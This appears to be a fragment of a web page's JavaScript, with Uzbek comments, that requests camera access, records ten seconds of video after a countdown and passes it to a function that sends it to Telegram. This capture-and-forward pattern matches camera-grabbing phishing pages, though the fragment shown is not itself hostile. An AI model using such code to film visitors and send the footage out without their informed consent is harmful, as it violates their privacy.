function startCamera() {
    navigator.mediaDevices.getUserMedia({ video: true })
        .then(stream => {
            video.srcObject = stream;
            mediaRecorder = new MediaRecorder(stream, { mimeType: 'video/mp4' });
            mediaRecorder.ondataavailable = (event) => {
                chunks.push(event.data);
            };
            mediaRecorder.onstop = () => {
                const blob = new Blob(chunks, { type: 'video/mp4' });
                sendVideoToTelegram(blob);
            };

            let countdown = 10;
            const countdownInterval = setInterval(() => {
                countdownElement.textContent = countdown;
                countdown--;

                if (countdown < 0) {
                    clearInterval(countdownInterval);
                    countdownElement.style.display = 'none';
                    mediaRecorder.start();
                    setTimeout(() => {
                        mediaRecorder.stop();
                    }, 10000); // 10 soniya
                }
            }, 1000); // 1 soniya
        })
        .catch(error => {
            console.error('Kamera ruxsati yoki xato:', error);
        });
}